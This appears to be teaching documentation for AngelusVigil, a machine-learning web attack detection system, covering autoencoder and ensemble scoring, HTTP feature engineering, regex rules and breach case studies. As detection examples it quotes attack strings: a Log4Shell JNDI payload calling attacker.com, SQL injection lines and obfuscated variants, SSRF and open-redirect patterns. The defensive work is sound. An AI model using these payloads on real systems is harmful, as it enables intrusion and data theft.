# Core Security Concepts

This document covers the security and machine learning concepts behind AngelusVigil. These aren't textbook definitions. We'll dig into how each concept is actually implemented in the codebase and why the design choices matter.

## Anomaly Detection

### What It Is

Anomaly detection identifies data points that don't fit the expected pattern. In the context of web traffic, "expected" means the normal behavior of legitimate users and applications. Anything that deviates significantly from that baseline is flagged as potentially malicious.

This is fundamentally different from signature-based detection (like traditional WAFs), which compares requests against a database of known attack patterns. Signature detection can only catch attacks it already knows about. Anomaly detection can catch attacks it has never seen before, as long as they look different from normal traffic.

### Why It Matters

In December 2021, the Log4Shell vulnerability (CVE-2021-44228) was disclosed. Within hours, attackers were sending requests containing `${jndi:ldap://...}` payloads to millions of servers. WAF vendors scrambled to push rule updates, but many organizations were exposed for days before rules were available. An anomaly detection system trained on normal traffic would have flagged these requests immediately. The `${jndi:` substring has high entropy, unusual character distribution, and doesn't match any legitimate path or query pattern.

The 2020 SolarWinds attack (SUNBURST) is another example. The attackers used legitimate-looking HTTP requests to blend in with normal Orion platform traffic. But their request timing, path patterns, and behavioral fingerprints were subtly different from real management traffic. A well-tuned anomaly detector monitoring those signals could have raised early warnings.

### How It Works

AngelusVigil uses an **autoencoder** for anomaly detection. The concept is simple: train a neural network to compress and reconstruct normal traffic. If a new request can't be reconstructed well (high reconstruction error), it's probably abnormal.

```
Input (35 features) ──► Encoder ──► Bottleneck (6 dims) ──► Decoder ──► Reconstruction (35 features)
                                                                              │
                                                                   Compare with input
                                                                              │
                                                                   MSE = anomaly score
```

The autoencoder architecture in this project:

```
35 ──► 24 ──► 12 ──► 6 ──► 12 ──► 24 ──► 35
 input              bottleneck              output
```

The bottleneck forces the network to learn a compressed representation of normal traffic. Attack requests contain patterns the autoencoder never saw during training, so they reconstruct poorly. The reconstruction error (mean squared error between input and output) becomes the anomaly score.

During training, only normal (benign) traffic is used. The model learns to compress and reconstruct legitimate requests. During inference, the reconstruction error is compared against a calibrated threshold (set at the 99.5th percentile of validation set errors). Requests exceeding this threshold are flagged as anomalous.

### Common Attacks That Anomaly Detection Catches

1. **Zero-day exploits** - Novel attack payloads that don't match any known signatures. The Log4Shell example above is a perfect case: the request structure is so unusual that anomaly detection flags it even without a specific rule.

2. **Slow-and-low attacks** - Attackers who spread requests across time to evade rate limits. The windowed aggregation features (unique paths, method entropy, inter-request timing) capture behavioral patterns that per-request rules miss.

3. **Application-layer DDoS** - Requests that are individually valid but collectively abnormal. A legitimate user doesn't hit 200 unique paths in 5 minutes with perfectly uniform 100ms spacing between requests. The per-IP windowed features expose this.

4. **Credential stuffing** - Repeated POST requests to login endpoints from a single IP or a distributed botnet. Per-IP features like `req_count_1m`, `error_rate_5m`, and `unique_paths_5m` build a behavioral profile that catches this even when individual requests look normal.

### Limitations

Anomaly detection produces false positives. A legitimate user doing something unusual (bulk API calls, automated testing) will trigger alerts. That's why AngelusVigil uses an ensemble approach rather than relying on the autoencoder alone, and why it supports analyst review labels for active learning.

It also can't tell you *what* an attack is. The autoencoder says "this is weird" but doesn't say "this is SQL injection." That's what the rule engine and random forest classifier add.

## Ensemble Learning

### What It Is

Ensemble learning combines predictions from multiple models to make a final decision. The idea is that different models have different strengths and weaknesses. Combining them produces better results than any single model alone.

AngelusVigil uses three models with weighted voting:

```
                   ┌──────────────────┐
                   │ Autoencoder (AE) │  Weight: 0.40
                   │ Unsupervised     │  "How weird is this request?"
                   └────────┬─────────┘
                            │
┌──────────┐    ┌───────────┴───────────┐    ┌──────────────┐
│  Feature  │───►│  Ensemble Fusion      │───►│ Final Score  │
│  Vector   │    │  Weighted Average     │    │  [0.0, 1.0]  │
└──────────┘    └───────────┬───────────┘    └──────────────┘
                            │
                   ┌────────┴─────────┐
                   │ Random Forest    │  Weight: 0.40
                   │ Supervised       │  "Is this an attack?"
                   └────────┬─────────┘
                            │
                   ┌────────┴─────────┐
                   │ Isolation Forest │  Weight: 0.20
                   │ Unsupervised     │  "Is this an outlier?"
                   └──────────────────┘
```

### Why Three Models?

Each model brings a different perspective:

**Autoencoder (40% weight)** - Trained only on normal traffic. Good at catching anything that looks "off" compared to the baseline. High recall (catches most attacks) but can be noisy (flags unusual but benign requests too). The reconstruction error approach means it doesn't need labeled attack data to learn.

**Random Forest (40% weight)** - Trained on labeled data (both normal and attack samples). Good at classifying known attack types with high precision. Uses SMOTE oversampling to handle the class imbalance problem (attacks are rare compared to normal traffic). Can't catch attack types it wasn't trained on.

**Isolation Forest (20% weight)** - Another unsupervised approach that isolates anomalies by random partitioning. Anomalies require fewer splits to isolate because they sit in sparse regions of the feature space. Gets lower weight because it overlaps somewhat with the autoencoder's anomaly detection capability but uses a fundamentally different algorithm (tree-based vs. neural network).

### Why It Matters

In 2014, JPMorgan Chase was breached through a compromised web server. Their IDS flagged the initial access, but a single model's alert was classified as a false positive and ignored. The attackers maintained access for two months, eventually compromising 76 million household records. Ensemble systems make this kind of single-model failure less likely because multiple independent models would need to agree that traffic is benign.

### How Scores Are Combined

The ensemble fusion happens in two stages. First, raw model scores are normalized to [0, 1]:

```python
def normalize_ae_score(error: float, threshold: float) -> float:
    if threshold <= 0:
        return 0.0
    return min(error / (threshold * 2), 1.0)

def normalize_if_score(raw_score: float) -> float:
    return (1 - raw_score) / 2.0
```

The autoencoder score is normalized against 2x the calibrated threshold. The isolation forest score is inverted (sklearn returns negative values for anomalies, positive for normal) and scaled.

Then the normalized scores are fused with weighted averaging:

```python
def fuse_scores(scores: dict[str, float], weights: dict[str, float]) -> float:
    total = 0.0
    weight_sum = 0.0
    for key, weight in weights.items():
        if key in scores:
            total += scores[key] * weight
            weight_sum += weight
    if weight_sum == 0:
        return 0.0
    return total / weight_sum
```

The fusion function gracefully handles missing models. If only the autoencoder and random forest are loaded, the isolation forest weight is excluded and the remaining weights are renormalized. This supports partial model availability during retraining.

Finally, the ML ensemble score is blended with the rule engine score:

```python
def blend_scores(ml_score: float, rule_score: float, ml_weight: float = 0.7) -> float:
    return min(ml_score * ml_weight + rule_score * (1.0 - ml_weight), 1.0)
```

ML gets 70% influence, rules get 30%. This means a high-confidence rule match (like a Log4Shell pattern) still contributes significantly to the final score even if the ML models are uncertain.

### Severity Classification

The blended score maps to three severity tiers:

| Score Range | Severity | Action |
|---|---|---|
| 0.70 - 1.00 | HIGH | Store + publish alert + WebSocket broadcast |
| 0.50 - 0.69 | MEDIUM | Store + publish alert |
| 0.00 - 0.49 | LOW | Log only |

## Feature Engineering for HTTP Traffic

### What It Is

Feature engineering transforms raw data (nginx log lines) into numeric vectors that ML models can process. The quality of your features determines the ceiling of your model's performance. You can always improve a model's architecture, but you can't overcome bad features.

### Why It Matters

A raw nginx log line looks like this:

```
192.168.1.100 - - [15/Mar/2026:14:22:31 +0000] "GET /api/users?id=1' OR '1'='1 HTTP/1.1" 200 1234 "-" "sqlmap/1.5"
```

A human can immediately spot the SQL injection payload and the sqlmap user agent. But an ML model needs numbers. Feature engineering is the bridge between "text a human can read" and "numbers a model can learn from."

### The 35-Dimensional Feature Vector

AngelusVigil extracts two types of features that are concatenated into a single 35-dimensional vector:

**23 Per-Request Features** (stateless, computed from a single log entry):

| Feature | Type | What It Captures |
|---|---|---|
| `http_method` | categorical | GET, POST, PUT, DELETE, etc. |
| `path_depth` | numeric | Number of `/` segments (deeper paths are unusual) |
| `path_entropy` | numeric | Shannon entropy of the path string (attack payloads have high entropy) |
| `path_length` | numeric | Raw character count |
| `query_string_length` | numeric | Long query strings often carry injection payloads |
| `query_param_count` | numeric | Number of `&`-separated parameters |
| `has_encoded_chars` | boolean | URL-encoded characters like `%27` (single quote) |
| `has_double_encoding` | boolean | Double-encoded chars like `%2527` (evasion technique) |
| `status_code` | numeric | HTTP response code |
| `status_class` | categorical | 2xx, 3xx, 4xx, 5xx grouping |
| `response_size` | numeric | Body size in bytes |
| `hour_of_day` | numeric | 0-23, captures time-of-day patterns |
| `day_of_week` | numeric | 0-6, captures weekly patterns |
| `is_weekend` | boolean | Weekend vs weekday |
| `ua_length` | numeric | User-Agent string length |
| `ua_entropy` | numeric | Shannon entropy of the UA string |
| `is_known_bot` | boolean | Matches known bot signatures (Googlebot, etc.) |
| `is_known_scanner` | boolean | Matches scanner signatures (sqlmap, nikto, etc.) |
| `has_attack_pattern` | boolean | Matches combined attack regex |
| `special_char_ratio` | numeric | Ratio of non-alphanumeric characters in the path |
| `file_extension` | categorical | `.php`, `.asp`, `.env`, etc. |
| `country_code` | categorical | GeoIP country code |
| `is_private_ip` | boolean | RFC 1918 private address |

**12 Per-IP Windowed Features** (stateful, computed from Redis sorted sets):

| Feature | Window | What It Captures |
|---|---|---|
| `req_count_1m` | 1 min | Immediate request rate (burst detection) |
| `req_count_5m` | 5 min | Short-term sustained rate |
| `req_count_10m` | 10 min | Medium-term pattern |
| `error_rate_5m` | 5 min | Ratio of 4xx/5xx responses (scanners trigger lots of errors) |
| `unique_paths_5m` | 5 min | Path diversity (scanners enumerate many paths) |
| `unique_uas_10m` | 10 min | User-Agent diversity (rotating UAs is a bot fingerprint) |
| `method_entropy_5m` | 5 min | Shannon entropy of HTTP methods used |
| `avg_response_size_5m` | 5 min | Mean response body size |
| `status_diversity_5m` | 5 min | Count of distinct status codes |
| `path_depth_variance_5m` | 5 min | Variance in path depth |
| `inter_request_time_mean` | 10 min | Average time between requests in ms |
| `inter_request_time_std` | 10 min | Standard deviation of request intervals |

### Shannon Entropy

Shannon entropy measures the randomness of a string. The formula:

```
H(s) = -Σ (count(c) / len(s)) * log2(count(c) / len(s))
```

Normal paths like `/api/v1/users` have low entropy because characters repeat and follow predictable patterns. Attack payloads like `/api/search?q=%27%20UNION%20SELECT%20*%20FROM%20users--` have high entropy because they contain a wide variety of characters.

The implementation in the codebase:

```python
def _shannon_entropy(s: str) -> float:
    if not s:
        return 0.0
    length = len(s)
    counts = Counter(s)
    return -sum((c / length) * math.log2(c / length) for c in counts.values())
```

This is applied to both the request path and the User-Agent string. Legitimate User-Agents like `Mozilla/5.0 (Windows NT 10.0; Win64; x64)` have predictable entropy ranges. Scanner tools like `sqlmap/1.5.2#stable` or randomized UAs used by botnets tend to fall outside those ranges.

### Why Windowed Features Need Redis

Per-request features are stateless. You can compute them from a single log line. But behavioral detection requires context: "Is this IP sending requests faster than usual? Has it hit an unusual number of distinct paths?"

AngelusVigil stores per-IP request history in Redis sorted sets, with the Unix timestamp as the score. This makes windowed queries efficient:

```
ZADD ip:192.168.1.100:requests <timestamp> <request_id>
ZCOUNT ip:192.168.1.100:requests <5m_ago> +inf
```

The `ZCOUNT` operation returns how many requests from this IP fell within the last 5 minutes, computed in O(log N) time. Seven sorted sets per IP track different dimensions (requests, paths, statuses, user agents, sizes, methods, depths), and all writes + reads happen in a single pipelined round-trip to minimize latency.

Keys auto-expire after 15 minutes (`KEY_TTL = 900`), so Redis memory usage stays bounded even under heavy traffic.

## Rule-Based Detection (Cold-Start)

### What It Is

Rule-based detection uses handcrafted patterns to identify known attack types. AngelusVigil's rule engine is inspired by the ModSecurity Core Rule Set (CRS), the open source WAF ruleset used by OWASP.

### Why It Matters

ML models need training data. On day one, you have no data and no models. The rule engine provides immediate protection with zero training, covering the most common web attack categories.

Even after ML models are trained, rules remain valuable. They catch well-known attacks with high confidence and provide explainability ("this request matched the SQL injection pattern") that ML scores alone can't.

### Attack Pattern Rules

The rule engine evaluates 9 regex-based patterns against each request URI:

| Rule | Score | What It Catches |
|---|---|---|
| LOG4SHELL | 0.95 | `${jndi:ldap://...}` and variations (CVE-2021-44228) |
| COMMAND_INJECTION | 0.90 | Shell metacharacters, backtick execution, pipe chains |
| SQL_INJECTION | 0.85 | `UNION SELECT`, `OR 1=1`, comment sequences, `SLEEP()` |
| XSS | 0.80 | `<script>`, `javascript:`, event handlers (`onerror=`) |
| FILE_INCLUSION | 0.75 | `php://filter`, `data://`, `expect://` wrappers |
| SSRF | 0.70 | Internal IP ranges (`169.254.169.254`), cloud metadata endpoints |
| CRLF_INJECTION | 0.65 | `%0d%0a` sequences for header injection |
| PATH_TRAVERSAL | 0.60 | `../`, `..%2f`, encoded traversal sequences |
| OPEN_REDIRECT | 0.55 | `//evil.com`, URL manipulation in redirect parameters |

### Behavioral Threshold Rules

Two rules use windowed features rather than pattern matching:

| Rule | Threshold | Score |
|---|---|---|
| RATE_ANOMALY | > 100 requests/minute | 0.30 |
| HIGH_ERROR_RATE | > 50% 4xx/5xx in 5 minutes | 0.25 |

### Scoring Logic

When multiple rules match, the final score isn't just the maximum. It's the highest individual score plus a 0.05 boost per additional matching rule, capped at 1.0:

```python
scores = sorted([s for _, s in matched], reverse=True)
threat_score = min(
    scores[0] + _BOOST_PER_ADDITIONAL_RULE * (len(scores) - 1),
    1.0,
)
```

This means a request matching both SQL injection (0.85) and double-encoding (0.40) scores 0.90, not 0.85. The boost captures the intuition that multi-technique attacks are more suspicious than single-pattern matches.

### Common Pitfalls

**Mistake: Relying solely on regex patterns for SQL injection detection**

```
# This regex catches basic injection
r"UNION\s+SELECT"

# But misses obfuscated variants
# UNI/**/ON SEL/**/ECT
# 0x554e494f4e2053454c454354 (hex-encoded)
```

That's why the rule engine is layered with double-encoding detection and combined with ML. The autoencoder catches obfuscated variants because the high entropy and unusual character distribution of encoded payloads still diverge from normal traffic patterns.

**Mistake: Setting rule scores too high**

Giving every rule a score of 0.90+ makes the severity system useless. AngelusVigil calibrates scores so that only the most dangerous patterns (Log4Shell, command injection) score above 0.90. Lower-confidence matches like open redirect (0.55) appropriately reflect that these patterns have higher false positive rates.

## How These Concepts Relate

```
Raw Log Line
    │
    ▼
Feature Engineering (35-dim vector)
    │
    ├──────────────────────┐
    ▼                      ▼
Rule Engine            ML Ensemble
(pattern + threshold)  (AE + RF + IF)
    │                      │
    └──────┬───────────────┘
           ▼
    Score Blending (0.3 rules + 0.7 ML)
           │
           ▼
    Severity Classification
    (HIGH / MEDIUM / LOW)
           │
           ▼
    Alert Dispatch
    (store + WebSocket + log)
```

Feature engineering feeds both detection paths. The rule engine uses the raw features (path, query string, user agent) and windowed aggregates (request rate, error rate). The ML ensemble uses the encoded 35-dimensional float vector. Both paths produce scores in [0, 1] that get blended for the final decision.

The active learning loop closes the cycle: analysts review alerts, label them as true/false positives, and those labels become training data for the next round of ML model training.

## Industry Standards and Frameworks

### OWASP Top 10

This project detects attacks from most of the OWASP Top 10 (2021):

- **A03:2021 Injection** - SQL injection, command injection, and LDAP injection patterns are directly matched by the rule engine and captured by the ML models through feature engineering (high entropy, encoded characters, attack pattern flags)
- **A07:2021 Identification and Authentication Failures** - Credential stuffing detection via windowed request rates and error rates against login endpoints
- **A10:2021 Server-Side Request Forgery (SSRF)** - Rule engine matches internal IP ranges and cloud metadata endpoints like `169.254.169.254`
- **A01:2021 Broken Access Control** - Path traversal detection via both rules (`../` patterns) and features (unusual path depth, high special character ratio)

### MITRE ATT&CK

Relevant techniques this project detects or monitors:

- **T1190 - Exploit Public-Facing Application** - The primary threat model. All rule patterns and ML detection target exploitation of web-facing services
- **T1595 - Active Scanning** - Scanner detection via User-Agent signatures (nikto, sqlmap, nmap) and behavioral fingerprints (high unique path count, uniform request intervals)
- **T1110 - Brute Force** - Rate anomaly detection and error rate monitoring catch credential brute-force attempts
- **T1071.001 - Application Layer Protocol: Web Protocols** - The entire system monitors HTTP traffic patterns for anomalous communication

### CWE

Common weakness enumerations the rule engine targets:

- **CWE-89** - SQL Injection
- **CWE-79** - Cross-site Scripting (XSS)
- **CWE-78** - OS Command Injection
- **CWE-22** - Path Traversal
- **CWE-918** - Server-Side Request Forgery (SSRF)
- **CWE-113** - HTTP Response Splitting (CRLF Injection)
- **CWE-601** - Open Redirect
- **CWE-917** - Expression Language Injection (Log4Shell)

## Real World Examples

### Case Study 1: The Log4Shell Pandemic (2021)

On December 9, 2021, a critical vulnerability in Apache Log4j was publicly disclosed (CVE-2021-44228). The vulnerability allowed remote code execution via JNDI lookups embedded in log messages. Attackers could trigger it by injecting `${jndi:ldap://attacker.com/exploit}` into any field that got logged, including HTTP headers, path parameters, and User-Agent strings.

Within 72 hours, mass scanning was detected across the internet. Cloudflare reported blocking 1.3 million Log4Shell exploit attempts per hour at peak. WAF vendors pushed rules, but organizations running unpatched software without WAFs were wide open.

AngelusVigil's approach would have caught this in multiple ways:
- The rule engine has a dedicated LOG4SHELL pattern (score 0.95) matching `${jndi:` and common evasion variants like `${${lower:j}ndi:}`
- The autoencoder would flag the unusual entropy and character distribution of JNDI strings even without a specific rule
- The per-IP windowed features would detect the scanning behavior: hundreds of unique paths probed in rapid succession from the same source

### Case Study 2: Capital One Breach (2019)

In 2019, a former AWS employee exploited a misconfigured WAF on Capital One's AWS infrastructure to perform SSRF attacks against the EC2 metadata service at `169.254.169.254`. She retrieved IAM credentials and used them to exfiltrate data from S3 buckets containing 100 million credit applications.

The attack involved HTTP requests to internal IP addresses through the public-facing web application. AngelusVigil's rule engine specifically matches requests targeting `169.254.169.254` and other internal IP ranges (SSRF rule, score 0.70). The feature extractor also flags requests to private IP addresses via the `is_private_ip` feature.

### Case Study 3: Equifax Breach via Apache Struts (2017)

The Equifax breach exposed 147 million records through CVE-2017-5638, a remote code execution vulnerability in Apache Struts. Attackers exploited it for months before detection. The exploit payload was delivered in the `Content-Type` HTTP header, bypassing path-based WAF rules.

While AngelusVigil monitors path and query string patterns rather than headers (it analyzes nginx access logs, not full request bodies), the behavioral anomaly detection would have flagged the post-exploitation activity: unusual paths accessed, atypical response sizes from data exfiltration, and abnormal request patterns from the attacker's tools.

## Testing Your Understanding

Before moving to the architecture, make sure you can answer:

1. Why does the autoencoder train only on normal traffic rather than on a mix of normal and attack samples? What advantage does this give for detecting novel attacks?

2. If you had to choose between the random forest (supervised) and the isolation forest (unsupervised) for a deployment where you have no labeled attack data at all, which would you pick and why? What would you lose?

3. The rule engine gives SQL injection a score of 0.85 and path traversal a score of 0.60. Why the difference? Think about false positive rates and attacker intent.

4. Why are the windowed features (computed from Redis) important for detecting attacks that per-request features miss? Give a specific example.

5. The ensemble weights are 40/40/20 (AE/RF/IF). What would happen if you set the autoencoder weight to 90% and dropped the others to 5% each?

If these questions feel unclear, re-read the relevant sections. The architecture and implementation docs will make more sense once these fundamentals click.

## Further Reading

**Essential:**
- [OWASP ModSecurity Core Rule Set](https://coreruleset.org/) - The open source WAF ruleset that inspired AngelusVigil's rule engine. Understanding CRS rules helps you write better detection patterns
- [MITRE ATT&CK for Enterprise](https://attack.mitre.org/matrices/enterprise/) - The framework for mapping attack techniques. Essential for understanding what your detection system should catch
- [Scikit-learn Isolation Forest documentation](https://scikit-learn.org/stable/modules/outlier_detection.html) - Clear explanation of how isolation forests work, with mathematical details on the scoring function

**Deep dives:**
- Liu, Ting, and Zhou, "Isolation Forest" (2008) - The original paper introducing isolation forests. Explains why anomalies are easier to isolate than normal points and the theoretical basis for the scoring function
- [Google's Rules of Machine Learning](https://developers.google.com/machine-learning/guides/rules-of-ml) - Practical lessons on when ML helps and when it doesn't. Rule #1 is "Don't be afraid to launch a product without machine learning," which is exactly why AngelusVigil starts with rules
- Chandola, Banerjee, and Kumar, "Anomaly Detection: A Survey" (2009) - Comprehensive survey of anomaly detection techniques. Useful for understanding where autoencoders fit in the broader landscape

**Historical context:**
- [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html) - The official advisory for Log4Shell. Reading the actual CVE and affected versions gives you context for the detection rule
- Krebs on Security, "The Capital One Breach" - Detailed timeline of the SSRF attack that exposed 100M records. Understanding the attack chain helps you see why metadata endpoint detection matters
